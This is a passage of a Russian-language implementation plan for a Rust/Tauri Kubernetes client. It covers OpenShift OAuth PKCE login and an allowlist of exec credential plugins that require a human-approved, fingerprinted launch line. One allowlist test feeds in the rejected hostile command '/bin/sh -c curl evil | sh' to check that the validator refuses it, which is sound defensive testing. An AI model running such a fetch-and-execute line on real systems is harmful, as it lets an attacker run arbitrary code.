pub fn authorize_url(
    meta: &OAuthMetadata,
    redirect_uri: &str,
    challenge: &str,
    state: &str,
) -> String {
    let query = url::form_urlencoded::Serializer::new(String::new())
        .append_pair("client_id", CLIENT_ID)
        .append_pair("response_type", "code")
        .append_pair("redirect_uri", redirect_uri)
        .append_pair("scope", "user:full")
        .append_pair("code_challenge", challenge)
        .append_pair("code_challenge_method", "S256")
        .append_pair("state", state)
        .finish();
    format!("{}?{query}", meta.authorization_endpoint)
}

/// Страница «Display Token» OAuth-сервера: запасной путь, если вход через браузер недоступен.
pub fn token_request_page(meta: &OAuthMetadata) -> String {
    format!("{}/oauth/token/request", meta.issuer.trim_end_matches('/'))
}

#[derive(Deserialize)]
struct TokenResponse {
    access_token: String,
}

#[derive(Deserialize, Default)]
struct TokenError {
    #[serde(default)]
    error: String,
    #[serde(default)]
    error_description: String,
}

/// Обмен кода авторизации на токен доступа.
pub async fn exchange_code(
    http: &reqwest::Client,
    meta: &OAuthMetadata,
    code: &str,
    verifier: &str,
    redirect_uri: &str,
) -> AppResult<String> {
    let r = http
        .post(&meta.token_endpoint)
        .form(&[
            ("grant_type", "authorization_code"),
            ("code", code),
            ("redirect_uri", redirect_uri),
            ("client_id", CLIENT_ID),
            ("code_verifier", verifier),
        ])
        .send()
        .await
        .map_err(|e| from_reqwest(&e))?;
    let status = r.status();
    let text = r.text().await.map_err(|e| from_reqwest(&e))?;
    if !status.is_success() {
        let err: TokenError = serde_json::from_str(&text).unwrap_or_default();
        let reason = [err.error_description, err.error]
            .into_iter()
            .find(|s| !s.is_empty())
            .unwrap_or_else(|| format!("HTTP {status}"));
        return Err(app_err!(
            ErrorCode::AuthFailed,
            "errors.oauth.rejected",
            "The OAuth server rejected the sign-in: {{reason}}",
            reason = reason
        ));
    }
    serde_json::from_str::<TokenResponse>(&text)
        .map(|t| t.access_token)
        .map_err(|e| {
            app_err!(
                ErrorCode::AuthFailed,
                "errors.oauth.badTokenResponse",
                "The OAuth server returned an unexpected response"
            )
            .with_details(e.to_string())
        })
}

/// Полный вход: метаданные → loopback-сервер → браузер → код → токен. Токен не сохраняется
/// здесь: это делает команда (keychain).
pub async fn login(
    p: &ConnectionProfile,
    open_browser: impl FnOnce(&str) -> AppResult<()>,
    cancel: oneshot::Receiver<()>,
    limit: Duration,
) -> AppResult<String> {
    let http = http_client(p)?;
    let meta = fetch_metadata(&http, &p.api_url).await?;
    let server = CallbackServer::bind().await?;
    let redirect_uri = server.redirect_uri.clone();
    let pkce = pkce::generate()?;
    let state = pkce::random_token()?;
    open_browser(&authorize_url(
        &meta,
        &redirect_uri,
        &pkce.challenge,
        &state,
    ))?;
    let code = server.wait(&state, limit, cancel).await?;
    exchange_code(&http, &meta, &code, &pkce.verifier, &redirect_uri).await
}
````

<!-- block: file t08-src-tauri-src-auth-pkce-rs-impl step=8.2 path=src-tauri/src/auth/pkce.rs part=impl -->
````rust
//! PKCE (RFC 7636, метод S256) и `state` запроса авторизации.

use base64::Engine;
use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use sha2::{Digest, Sha256};

use crate::error::{AppError, AppResult};

#[derive(Debug, Clone)]
pub struct Pkce {
    pub verifier: String,
    pub challenge: String,
}

/// `code_challenge` для `verifier`: BASE64URL(SHA256(verifier)) без выравнивания.
pub fn challenge_for(verifier: &str) -> String {
    URL_SAFE_NO_PAD.encode(Sha256::digest(verifier.as_bytes()))
}

/// 32 случайных байта из генератора ОС в BASE64URL: 43 символа.
pub fn random_token() -> AppResult<String> {
    let mut buf = [0u8; 32];
    getrandom::fill(&mut buf).map_err(|e| AppError::internal_with(format!("getrandom: {e}")))?;
    Ok(URL_SAFE_NO_PAD.encode(buf))
}

pub fn generate() -> AppResult<Pkce> {
    let verifier = random_token()?;
    Ok(Pkce {
        challenge: challenge_for(&verifier),
        verifier,
    })
}
````

<!-- block: file t08-src-tauri-src-tls-rs step=8.2 path=src-tauri/src/tls.rs -->
````rust
//! Криптопровайдер rustls один на процесс: `kube` и HTTP-клиент входа используют ring.

/// Ставит ring провайдером по умолчанию, если он ещё не выбран. Повторный вызов безвреден.
pub fn ensure_crypto_provider() {
    let _ = rustls::crypto::ring::default_provider().install_default();
}
````

<!-- block: patch t08-src step=8.2 -->
````diff
diff --git a/src-tauri/Cargo.toml b/src-tauri/Cargo.toml
--- a/src-tauri/Cargo.toml
+++ b/src-tauri/Cargo.toml
@@ -37,6 +37,10 @@ secrecy = "0.10"
 base64 = "0.22"
 regex = "1"
 tokio = { version = "1", features = ["rt", "macros", "time", "net", "io-util", "sync"] }
+reqwest = { version = "0.13", default-features = false, features = ["rustls-no-provider", "json", "form", "http2", "system-proxy"] }
+rustls = { version = "0.23", default-features = false, features = ["ring", "std", "tls12"] }
+sha2 = "0.11"
+getrandom = "0.4"
 sys-locale = "0.3"
 
 [target.'cfg(windows)'.dependencies]
diff --git a/src-tauri/src/lib.rs b/src-tauri/src/lib.rs
--- a/src-tauri/src/lib.rs
+++ b/src-tauri/src/lib.rs
@@ -1,5 +1,6 @@
 #[macro_use]
 pub mod i18n;
+pub mod auth;
 pub mod commands;
 mod dock_name;
 pub mod error;
@@ -13,6 +14,7 @@ pub mod settings;
 pub mod state;
 pub mod storage;
 pub mod sync;
+pub mod tls;
 
 use std::sync::Arc;
 
@@ -23,6 +25,7 @@ use crate::state::AppState;
 
 #[cfg_attr(mobile, tauri::mobile_entry_point)]
 pub fn run() {
+    crate::tls::ensure_crypto_provider();
     tauri::Builder::default()
         .plugin(tauri_plugin_opener::init())
         .plugin(tauri_plugin_dialog::init())
````

Применить: `python3 /tmp/o1a-blocks.py step 8.2`.

- [ ] **Step 3: Проверки.**

Run: `cargo test --manifest-path src-tauri/Cargo.toml --lib`  
Expected: PASS — `test result: ok. 142 passed; 0 failed`

Run: `cargo clippy --manifest-path src-tauri/Cargo.toml --all-targets -- -D warnings`  
Expected: PASS — без предупреждений

Run: `cargo fmt --manifest-path src-tauri/Cargo.toml --check`  
Expected: PASS — без изменений

- [ ] **Step 4: Commit.**

```bash
git add -A
git commit -s -m "feat(auth): вход через браузер в OAuth OpenShift — PKCE, loopback-redirect, обмен кода на токен" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

### Task 9: Exec-плагины: профиль, список разрешённых команд, подтверждение строки запуска

**Files:**
- Create: `src-tauri/src/auth/exec.rs`
- Modify: `src-tauri/src/auth/mod.rs`, `src-tauri/src/commands/folders.rs`, `src-tauri/src/k8s/config.rs`, `src-tauri/src/k8s/connectivity.rs`, `src-tauri/src/storage/exchange.rs`, `src-tauri/src/storage/profile.rs`

**Interfaces:**
- Consumes: задачи 3–7.
- Produces: `storage::profile::{AuthConfig::Exec(ExecAuth), ExecAuth { command, args, env, api_version, provide_cluster_info, approved }, ExecEnv { name, value }, EXEC_API_V1, EXEC_API_V1BETA1}`, в тестах — `sample_exec()`; `auth::exec::{ALLOWED, command_name, check_allowed(command, args) -> Result<(), LocalizedText>, is_secret_name, fingerprint(&ExecAuth) -> String, is_approved, standard_dirs(home, local_app_data), search_dirs(path_var, standard), resolve_command(command, base, dirs, is_file) -> Option<PathBuf>}`; `ImportOptions.allow_exec_auth`; ключи `errors.exec.*`, `errors.connections.execForbidden`, `errors.import.execForbidden`.

Спец. §5.2, §12. Новый способ входа `AuthConfig::Exec(ExecAuth)`: абсолютный путь к команде, аргументы, переменные окружения, версия API (`client.authentication.k8s.io/v1` или `v1beta1`), `provideClusterInfo` и `approved` — отпечаток (SHA-256) строки запуска, которую подтвердил человек; изменённая строка с отпечатком не совпадает и требует нового подтверждения. Список разрешённых — константа `auth::exec::ALLOWED`: имя файла (на Windows — без `.exe` и регистра) и первые позиционные аргументы; ведущие ключи `--ключ значение` пропускаются (уточнение спеки: `aws eks update-kubeconfig` пишет `--region` перед `eks get-token`). Проверка профиля требует абсолютный путь, команду из списка, известную версию API и корректные имена переменных. Поиск команды (`resolve_command`) — по PATH и стандартным каталогам (`/opt/homebrew/bin`, `/usr/local/bin`, `~/.local/bin`; на Windows — ярлыки winget и `%LOCALAPPDATA%`), относительный путь — от каталога kubeconfig. Файл обмена переносит строку запуска без подтверждения и без значений переменных, похожих на секреты; импорт файла подтверждение сбрасывает, политика `allowExecAuth = false` пропускает такие подключения, а `ensure_allowed` запрещает их проверку, сохранение и подключение. Учётных данных у exec-профиля `build_kube_config` не ставит: их выдаёт запуск плагина (задача 10).

- [ ] **Step 1: Тесты.**

<!-- block: file t09-src-tauri-src-auth-exec-rs-tests step=9.1 path=src-tauri/src/auth/exec.rs part=tests -->
````rust
#[cfg(test)]
mod tests {
    use super::*;
    use crate::storage::profile::{ExecEnv, sample_exec};

    fn args(list: &[&str]) -> Vec<String> {
        list.iter().map(|s| s.to_string()).collect()
    }

    /// Список разрешённых команд (спец. §5.2): имя и первые аргументы.
    #[test]
    fn allowlist_table() {
        let allowed = [
            (
                "/usr/local/bin/aws",
                &[
                    "--region",
                    "eu-west-1",
                    "eks",
                    "get-token",
                    "--cluster-name",
                    "c",
                ][..],
            ),
            (
                "/usr/local/bin/aws",
                &["--profile=dev", "eks", "get-token"][..],
            ),
            ("/usr/bin/aws-iam-authenticator", &["token", "-i", "c"][..]),
            ("/opt/gcloud/bin/gke-gcloud-auth-plugin", &[][..]),
            (
                "/opt/homebrew/bin/kubelogin",
                &["get-token", "--login", "azurecli", "--server-id", "x"][..],
            ),
            (
                "/usr/local/bin/kubectl",
                &["oidc-login", "get-token", "--oidc-issuer-url=https://dex"][..],
            ),
            (
                "/usr/local/bin/oc",
                &["get-token", "--issuer-url=https://x"][..],
            ),
            (
                "/home/u/yandex-cloud/bin/yc",
                &["k8s", "create-token", "--profile=default"][..],
            ),
            (
                "/usr/local/bin/rancher",
                &["token", "--server=rancher.corp"][..],
            ),
        ];
        for (cmd, a) in allowed {
            assert_eq!(check_allowed(cmd, &args(a)), Ok(()), "{cmd} {a:?}");
        }
        let rejected = [
            (
                "/bin/sh",
                &["-c", "curl evil | sh"][..],
                "errors.exec.notAllowed",
            ),
            (
                "/usr/bin/python3",
                &["get-token"][..],
                "errors.exec.notAllowed",
            ),
            (
                "/usr/local/bin/kubectl",
                &["get", "pods"][..],
                "errors.exec.argsNotAllowed",
            ),
            (
                "/usr/local/bin/kubectl",
                &["oidc-login"][..],
                "errors.exec.argsNotAllowed",
            ),
            (
                "/usr/local/bin/aws",
                &["s3", "ls"][..],
                "errors.exec.argsNotAllowed",
            ),
            ("/usr/local/bin/oc", &[][..], "errors.exec.argsNotAllowed"),
            (
                "/usr/local/bin/kubectl-evil",
                &["oidc-login", "get-token"][..],
                "errors.exec.notAllowed",
            ),
        ];
        for (cmd, a, key) in rejected {
            assert_eq!(
                check_allowed(cmd, &args(a)).unwrap_err().key,
                key,
                "{cmd} {a:?}"
            );
        }
        let e = check_allowed("/usr/local/bin/kubectl", &args(&["get"])).unwrap_err();
        assert_eq!(e.params["expected"], "kubectl oidc-login get-token");
    }

    #[test]
    fn command_names() {
        assert_eq!(command_name("/usr/local/bin/kubelogin"), "kubelogin");
        assert_eq!(command_name("kubelogin.exe"), "kubelogin");
        assert_eq!(command_name("aws.EXE"), "aws");
        assert_eq!(command_name(""), "");
    }

    #[test]
    fn secret_like_names() {
        for s in [
            "AWS_SECRET_ACCESS_KEY",
            "AWS_SESSION_TOKEN",
            "OIDC_PASSWORD",
            "api_key",
        ] {
            assert!(is_secret_name(s), "{s}");
        }
        for s in [
            "AWS_PROFILE",
            "AWS_REGION",
            "HTTPS_PROXY",
            "KUBECONFIG",
            "PATH",
        ] {
            assert!(!is_secret_name(s), "{s}");
        }
    }

    #[test]
    fn approval_follows_the_launch_line() {
        let mut e = sample_exec();
        assert!(!is_approved(&e));
        e.approved = Some(fingerprint(&e));
        assert!(is_approved(&e));
        let fp = fingerprint(&e);
        assert_eq!(fp.len(), 64);
        for change in [
            |e: &mut ExecAuth| e.command = "/opt/homebrew/bin/kubectl".into(),
            |e: &mut ExecAuth| e.args.push("--v=1".into()),
            |e: &mut ExecAuth| {
                e.env.push(ExecEnv {
                    name: "X".into(),
                    value: "1".into(),
                })
            },
            |e: &mut ExecAuth| e.env[0].value = "http://other:3128".into(),
            |e: &mut ExecAuth| e.provide_cluster_info = true,
        ] {
            let mut changed = e.clone();
            change(&mut changed);
            assert!(!is_approved(&changed), "{changed:?}");
        }
    }

    #[test]
    fn command_resolution() {
        let files = [
            PathBuf::from("/opt/homebrew/bin/kubelogin"),
            PathBuf::from("/home/u/.kube/bin/plugin"),
            PathBuf::from("/usr/bin/aws"),
        ];
        let is_file = |p: &Path| files.iter().any(|f| f == p);
        let dirs = search_dirs(
            Some("/usr/bin:/bin"),
            standard_dirs(Some(Path::new("/home/u")), None),
        );
        if cfg!(unix) {
            assert_eq!(
                dirs,
                [
                    "/usr/bin",
                    "/bin",
                    "/opt/homebrew/bin",
                    "/usr/local/bin",
                    "/home/u/.local/bin"
                ]
                .map(PathBuf::from)
            );
            assert_eq!(
                resolve_command("kubelogin", None, &dirs, &is_file),
                Some(PathBuf::from("/opt/homebrew/bin/kubelogin"))
            );
            assert_eq!(
                resolve_command("aws", None, &dirs, &is_file),
                Some(PathBuf::from("/usr/bin/aws")),
                "PATH раньше стандартных каталогов"
            );
            assert_eq!(
                resolve_command(
                    "bin/plugin",
                    Some(Path::new("/home/u/.kube")),
                    &dirs,
                    &is_file
                ),
                Some(PathBuf::from("/home/u/.kube/bin/plugin")),
                "относительный путь — от каталога kubeconfig"
            );
            assert_eq!(
                resolve_command("/usr/bin/aws", None, &[], &is_file),
                Some(PathBuf::from("/usr/bin/aws"))
            );
        }
        assert_eq!(
            resolve_command("gke-gcloud-auth-plugin", None, &dirs, &is_file),
            None
        );
        assert_eq!(resolve_command(" ", None, &dirs, &is_file), None);
    }
}
````

Применить: `python3 /tmp/o1a-blocks.py step 9.1`.

- [ ] **Step 2: Реализация.**

<!-- block: file t09-src-tauri-src-auth-exec-rs-impl step=9.2 path=src-tauri/src/auth/exec.rs part=impl -->
````rust
//! Exec-плагины kubeconfig (спец. §5.2): список разрешённых команд, путь к команде, строка запуска
//! и её подтверждение человеком. Glafira запускает только команды из списка, по абсолютному пути
//! и без оболочки.

use std::path::{Path, PathBuf};

use sha2::{Digest, Sha256};

use crate::i18n::LocalizedText;
use crate::storage::profile::ExecAuth;

/// Разрешённые команды: имя исполняемого файла и первые позиционные аргументы
/// (пустой список — любые аргументы).
pub const ALLOWED: &[(&str, &[&str])] = &[
    // EKS
    ("aws", &["eks", "get-token"]),
    // EKS, старые kubeconfig
    ("aws-iam-authenticator", &["token"]),
    // GKE
    ("gke-gcloud-auth-plugin", &[]),
    // AKS (Azure kubelogin) и OIDC (int128/kubelogin)
    ("kubelogin", &["get-token"]),
    // OIDC: Keycloak, Dex (в том числе Deckhouse)
    ("kubectl", &["oidc-login", "get-token"]),
    // OpenShift с внешним OIDC (ROSA HCP с external auth)
    ("oc", &["get-token"]),
    // Yandex Managed Kubernetes
    ("yc", &["k8s", "create-token"]),
    // Rancher без генерации токенов в kubeconfig
    ("rancher", &["token"]),
];

/// Имя исполняемого файла без каталога и `.exe`; на Windows — без учёта регистра.
pub fn command_name(command: &str) -> String {
    let name = Path::new(command)
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_default();
    let name = if cfg!(windows) {
        name.to_lowercase()
    } else {
        name
    };
    match name.len().checked_sub(4) {
        Some(i) if name.is_char_boundary(i) && name[i..].eq_ignore_ascii_case(".exe") => {
            name[..i].to_string()
        }
        _ => name,
    }
}

/// Позиционные аргументы: ведущие ключи пропускаются (`--ключ значение`, `--ключ=значение`) —
/// так `aws eks update-kubeconfig` пишет `--region` перед `eks get-token`.
fn positional(args: &[String]) -> &[String] {
    let mut i = 0;
    while i < args.len() && args[i].starts_with('-') {
        i += if args[i].contains('=') { 1 } else { 2 };
    }
    &args[i.min(args.len())..]
}

/// Разрешена ли команда: имя файла и первые позиционные аргументы из `ALLOWED`.
pub fn check_allowed(command: &str, args: &[String]) -> Result<(), LocalizedText> {
    let name = command_name(command);
    let Some((_, prefix)) = ALLOWED.iter().find(|(n, _)| *n == name) else {
        return Err(ltext!(
            "errors.exec.notAllowed",
            "“{{command}}” is not in the list of allowed exec plugins",
            command = name
        ));
    };
    let pos = positional(args);
    let matches = pos.len() >= prefix.len() && prefix.iter().zip(pos).all(|(p, a)| p == a);
    if !matches {
        return Err(ltext!(
            "errors.exec.argsNotAllowed",
            "The exec plugin “{{command}}” may run only as “{{expected}} …”",
            command = name,
            expected = std::iter::once(name.as_str())
                .chain(prefix.iter().copied())
                .collect::<Vec<_>>()
                .join(" ")
        ));
    }
    Ok(())
}

/// Похоже ли имя переменной окружения на секрет: такие значения не показываются и не экспортируются.
pub fn is_secret_name(name: &str) -> bool {
    let n = name.to_ascii_uppercase();
    ["TOKEN", "SECRET", "PASSWORD", "PASSWD", "KEY", "CREDENTIAL"]
        .iter()
        .any(|w| n.contains(w))
}

/// Отпечаток строки запуска: путь, аргументы, переменные окружения, версия API и
/// `provideClusterInfo`. Подтверждение человека хранится как этот отпечаток.
pub fn fingerprint(e: &ExecAuth) -> String {
    let env: Vec<(&str, &str)> = e
        .env
        .iter()
        .map(|v| (v.name.as_str(), v.value.as_str()))
        .collect();
    let canonical = serde_json::to_vec(&(
        &e.command,
        &e.args,
        env,
        &e.api_version,
        e.provide_cluster_info,
    ))
    .expect("serializable");
    Sha256::digest(&canonical)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

/// Подтверждена ли человеком именно эта строка запуска.
pub fn is_approved(e: &ExecAuth) -> bool {
    e.approved.as_deref() == Some(fingerprint(e).as_str())
}

/// Стандартные каталоги команд, которых может не быть в PATH приложения: Homebrew,
/// `/usr/local/bin`, `~/.local/bin`; на Windows — ярлыки winget и `%LOCALAPPDATA%`.
pub fn standard_dirs(home: Option<&Path>, local_app_data: Option<&Path>) -> Vec<PathBuf> {
    if cfg!(windows) {
        local_app_data
            .map(|d| {
                vec![
                    d.join("Microsoft").join("WinGet").join("Links"),
                    d.to_path_buf(),
                ]
            })
            .unwrap_or_default()
    } else {
        let mut dirs = vec![
            PathBuf::from("/opt/homebrew/bin"),
            PathBuf::from("/usr/local/bin"),
        ];
        if let Some(h) = home {
            dirs.push(h.join(".local").join("bin"));
        }
        dirs
    }
}

/// Где искать команду: каталоги PATH (оболочки входа или процесса), затем стандартные; без повторов.
pub fn search_dirs(path_var: Option<&str>, standard: Vec<PathBuf>) -> Vec<PathBuf> {
    let mut out: Vec<PathBuf> = Vec::new();
    let from_path = path_var
        .map(|p| std::env::split_paths(p).collect::<Vec<_>>())
        .unwrap_or_default();
    for d in from_path.into_iter().chain(standard) {
        if !d.as_os_str().is_empty() && !out.contains(&d) {
            out.push(d);
        }
    }
    out
}

/// Абсолютный путь к команде: абсолютный путь — как есть, относительный путь с каталогом —
/// от каталога kubeconfig (`base`, как у kubectl), имя — поиском по `dirs`. `None` — не найдена.
pub fn resolve_command(
    command: &str,
    base: Option<&Path>,
    dirs: &[PathBuf],
    is_file: &dyn Fn(&Path) -> bool,
) -> Option<PathBuf> {
    let p = Path::new(command.trim());
    if p.as_os_str().is_empty() {
        return None;
    }
    if p.is_absolute() {
        return is_file(p).then(|| p.to_path_buf());
    }
    if p.components().count() > 1 {
        return base.map(|b| b.join(p)).filter(|c| is_file(c));
    }
    dirs.iter().find_map(|d| {
        let mut candidates = vec![d.join(p)];
        if cfg!(windows) && p.extension().is_none() {
            candidates.push(d.join(format!("{}.exe", p.display())));
        }
        candidates.into_iter().find(|c| is_file(c))
    })
}
````

<!-- block: patch t09-src step=9.2 -->
````diff
diff --git a/src-tauri/src/auth/mod.rs b/src-tauri/src/auth/mod.rs
--- a/src-tauri/src/auth/mod.rs
+++ b/src-tauri/src/auth/mod.rs
@@ -1,5 +1,6 @@
 //! Вход через браузер в OAuth OpenShift (спец. §5.2): Authorization Code + PKCE, как `oc login --web`.
 
 pub mod callback;
+pub mod exec;
 pub mod oauth;
 pub mod pkce;
diff --git a/src-tauri/src/commands/folders.rs b/src-tauri/src/commands/folders.rs
--- a/src-tauri/src/commands/folders.rs
+++ b/src-tauri/src/commands/folders.rs
@@ -150,6 +150,7 @@ fn import_from_file(
         target,
         update_existing,
         allow_insecure_tls: st.policy.status.allow_insecure_tls,
+        allow_exec_auth: st.policy.status.allow_exec_auth,
     };
     if !apply {
         return Ok(plan_import(&st.connections.snapshot(), &parsed, &opts)?.preview);
diff --git a/src-tauri/src/k8s/config.rs b/src-tauri/src/k8s/config.rs
--- a/src-tauri/src/k8s/config.rs
+++ b/src-tauri/src/k8s/config.rs
@@ -69,7 +69,8 @@ fn token(p: &ConnectionProfile, secrets: &dyn SecretStore) -> AppResult<String>
 }
 
 /// `kube::Config` профиля. Таймаут ответа не задаётся: он оборвал бы долгие потоки (логи, watch);
-/// таймаут запроса ставит вызывающий код (`request_timeout`).
+/// таймаут запроса ставит вызывающий код (`request_timeout`). У exec-плагина учётных данных здесь
+/// нет: их выдаёт запуск плагина (задача следующего шага), конфигурация — без них.
 pub fn build_kube_config(
     p: &ConnectionProfile,
     secrets: &dyn SecretStore,
@@ -113,6 +114,7 @@ pub fn build_kube_config(
         })
         .transpose()?;
     c.auth_info = match &p.auth {
+        AuthConfig::Exec(_) => AuthInfo::default(),
         AuthConfig::Token | AuthConfig::Browser => AuthInfo {
             token: Some(SecretString::from(token(p, secrets)?)),
             ..Default::default()
diff --git a/src-tauri/src/k8s/connectivity.rs b/src-tauri/src/k8s/connectivity.rs
--- a/src-tauri/src/k8s/connectivity.rs
+++ b/src-tauri/src/k8s/connectivity.rs
@@ -13,7 +13,7 @@ use crate::k8s::config::{build_kube_config, process_env, request_timeout};
 use crate::k8s::errors::from_kube;
 use crate::policy::PolicyStatus;
 use crate::secrets::SecretStore;
-use crate::storage::profile::{CaConfig, ConnectionProfile};
+use crate::storage::profile::{AuthConfig, CaConfig, ConnectionProfile};
 
 #[derive(Debug, Clone, Serialize)]
 #[serde(rename_all = "camelCase")]
@@ -59,6 +59,13 @@ pub fn ensure_allowed(p: &ConnectionProfile, policy: &PolicyStatus) -> AppResult
             "Connections without TLS certificate verification are forbidden by your organization"
         ));
     }
+    if matches!(p.auth, AuthConfig::Exec(_)) && !policy.allow_exec_auth {
+        return Err(app_err!(
+            ErrorCode::InvalidInput,
+            "errors.connections.execForbidden",
+            "Connections with exec plugins are forbidden by your organization"
+        ));
+    }
     Ok(())
 }
 
@@ -430,6 +437,23 @@ mod tests {
         assert_eq!(tcp_target(&c).1, 443);
     }
 
+    #[test]
+    fn policy_forbids_insecure_tls_and_exec_plugins() {
+        let open = PolicyStatus::default();
+        let mut p = sample_profile("a");
+        p.auth = AuthConfig::Exec(crate::storage::profile::sample_exec());
+        assert!(ensure_allowed(&p, &open).is_ok());
+        let strict = PolicyStatus {
+            allow_exec_auth: false,
+            ..PolicyStatus::default()
+        };
+        assert_eq!(
+            ensure_allowed(&p, &strict).unwrap_err().key,
+            "errors.connections.execForbidden"
+        );
+        assert!(ensure_allowed(&sample_profile("b"), &strict).is_ok());
+    }
+
     #[tokio::test]
     async fn config_errors_stop_before_network() {
         let open = PolicyStatus::default();
diff --git a/src-tauri/src/storage/exchange.rs b/src-tauri/src/storage/exchange.rs
--- a/src-tauri/src/storage/exchange.rs
+++ b/src-tauri/src/storage/exchange.rs
@@ -68,6 +68,19 @@ fn needs_secret(secrets: &dyn SecretStore, p: &ConnectionProfile) -> AppResult<N
     })
 }
 
+/// Exec-плагин в файле обмена: строка запуска переносится, но её подтверждение — нет
+/// (получатель подтверждает её заново), значения переменных, похожих на секреты, не пишутся.
+fn strip_exec_for_export(p: &mut ConnectionProfile) {
+    if let AuthConfig::Exec(e) = &mut p.auth {
+        e.approved = None;
+        for v in &mut e.env {
+            if crate::auth::exec::is_secret_name(&v.name) {
+                v.value.clear();
+            }
+        }
+    }
+}
+
 /// Собирает файл экспорта: всё дерево или поддерево `root` (сама папка становится корнем).
 /// Секреты keychain не попадают в файл; неизвестные локальные поля (`extra`) не выносятся.
 pub fn build_export(
@@ -123,6 +136,7 @@ pub fn build_export(
         .filter(|p| in_scope(p.folder_id.as_deref()))
         .map(|mut profile| {
             profile.extra.clear();
+            strip_exec_for_export(&mut profile);
             let needs_secret = needs_secret(secrets, &profile)?;
             Ok(ExportedConnection {
                 profile,
@@ -244,8 +258,12 @@ pub fn parse_exchange(bytes: &[u8]) -> AppResult<ParsedExchange> {
                 continue;
             }
         };
-        // Неизвестные поля файла не переносятся в хранилище.
+        // Неизвестные поля файла не переносятся в хранилище; строку запуска exec-плагина
+        // из чужого файла человек подтверждает заново (спец. §5.2).
         c.profile.extra.clear();
+        if let AuthConfig::Exec(e) = &mut c.profile.auth {
+            e.approved = None;
+        }
         if let Err(e) = validate_profile(&c.profile) {
             skipped.push(Skipped {
                 name,
@@ -278,6 +296,8 @@ pub struct ImportOptions<'a> {
     pub update_existing: bool,
     /// `false` — политика запрещает подключения без проверки сертификата (спец. §12).
     pub allow_insecure_tls: bool,
+    /// `false` — политика запрещает exec-плагины (спец. §5.2).
+    pub allow_exec_auth: bool,
 }
 
 #[derive(Serialize, Debug, Clone, PartialEq)]
@@ -446,6 +466,16 @@ pub(crate) fn plan_import(
             });
             continue;
         }
+        if !opts.allow_exec_auth && matches!(incoming.auth, AuthConfig::Exec(_)) {
+            preview.skipped.push(Skipped {
+                name: incoming.name.clone(),
+                reason: ltext!(
+                    "errors.import.execForbidden",
+                    "Connections with exec plugins are forbidden by your organization"
+                ),
+            });
+            continue;
+        }
         let mut profile = incoming.clone();
         if let Some(slot) = next.connections.iter_mut().find(|c| c.id == profile.id) {
             if same_settings(slot, incoming) || !opts.update_existing {
@@ -741,6 +771,7 @@ mod tests {
             target,
             update_existing: true,
             allow_insecure_tls: true,
+            allow_exec_auth: true,
         }
     }
 
@@ -946,6 +977,58 @@ mod tests {
         assert_eq!(parsed.skipped[0].reason.key, "errors.import.duplicateId");
     }
 
+    #[test]
+    fn exec_launch_line_is_exported_without_approval_and_secret_values() {
+        let (_d, s) = store();
+        let mut p = sample_profile("e");
+        let mut exec = crate::storage::profile::sample_exec();
+        exec.env.push(crate::storage::profile::ExecEnv {
+            name: "AWS_SECRET_ACCESS_KEY".into(),
+            value: "s3cr3t".into(),
+        });
+        exec.approved = Some(crate::auth::exec::fingerprint(&exec));
+        p.auth = AuthConfig::Exec(exec);
+        s.upsert(p).unwrap();
+        let out = build_export(&s, &MemoryStore::default(), None, "1", "now").unwrap();
+        let v = serde_json::to_value(&out).unwrap();
+        let auth = &v["connections"][0]["auth"];
+        assert_eq!(auth["method"], "exec");
+        assert_eq!(auth["args"][1], "get-token");
+        assert_eq!(auth["approved"], serde_json::Value::Null);
+        assert_eq!(auth["env"][0]["value"], "http://proxy:3128");
+        assert_eq!(auth["env"][1]["value"], "", "секрет не пишется");
+        assert!(!serde_json::to_string(&v).unwrap().contains("s3cr3t"));
+    }
+
+    #[test]
+    fn exec_import_needs_new_confirmation_and_respects_policy() {
+        let mut exec = crate::storage::profile::sample_exec();
+        exec.approved = Some(crate::auth::exec::fingerprint(&exec));
+        let mut e = conn_json("e", "Exec", None);
+        e["auth"] = serde_json::to_value(AuthConfig::Exec(exec)).unwrap();
+        let bytes = file(vec![], vec![e, conn_json("ok", "OK", None)]);
+        let parsed = parse_exchange(&bytes).unwrap();
+        let AuthConfig::Exec(imported) = &parsed.connections[0].0.auth else {
+            panic!("exec")
+        };
+        assert_eq!(
+            imported.approved, None,
+            "подтверждение из файла не принимается"
+        );
+        let p = plan_import(&StoreData::default(), &parsed, &opts(None)).unwrap();
+        assert_eq!(preview_ids(&p.preview.added), ["e", "ok"]);
+        let forbid = ImportOptions {
+            allow_exec_auth: false,
+            ..opts(None)
+        };
+        let p = plan_import(&StoreData::default(), &parsed, &forbid).unwrap();
+        assert_eq!(preview_ids(&p.preview.added), ["ok"]);
+        assert_eq!(
+            p.preview.skipped[0].reason.key,
+            "errors.import.execForbidden"
+        );
+    }
+
     #[test]
     fn insecure_connections_are_skipped_when_policy_forbids() {
         let mut insecure = conn_json("i", "Insecure", None);
diff --git a/src-tauri/src/storage/profile.rs b/src-tauri/src/storage/profile.rs
--- a/src-tauri/src/storage/profile.rs
+++ b/src-tauri/src/storage/profile.rs
@@ -26,6 +26,48 @@ pub enum AuthConfig {
     /// Клиентский сертификат: сертификат (PEM) — в профиле, ключ — в keychain.
     #[serde(rename_all = "camelCase")]
     ClientCert { certificate_pem: String },
+    /// Exec-плагин kubeconfig из списка разрешённых (спец. §5.2); учётные данные выдаёт плагин,
+    /// в keychain ничего не хранится.
+    Exec(ExecAuth),
+}
+
+/// Exec-плагин: что и как запускать. Секретов здесь нет (как и в kubeconfig, откуда он обычно
+/// приходит); значения переменных с именами, похожими на секреты, интерфейс скрывает,
+/// а экспорт не пишет.
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
+#[serde(rename_all = "camelCase")]
+pub struct ExecAuth {
+    /// Абсолютный путь к команде: имя из kubeconfig разрешается при импорте или кнопкой «Найти»
+    /// в форме — у приложения из Dock нет PATH оболочки.
+    pub command: String,
+    #[serde(default)]
+    pub args: Vec<String>,
+    #[serde(default)]
+    pub env: Vec<ExecEnv>,
+    /// `client.authentication.k8s.io/v1` или `v1beta1`.
+    #[serde(default = "default_exec_api_version")]
+    pub api_version: String,
+    /// Передать плагину адрес и CA кластера (`provideClusterInfo` в kubeconfig).
+    #[serde(default)]
+    pub provide_cluster_info: bool,
+    /// Отпечаток строки запуска, которую подтвердил человек (`auth::exec::fingerprint`);
+    /// изменённая строка требует нового подтверждения. Ставят только сохранение из формы
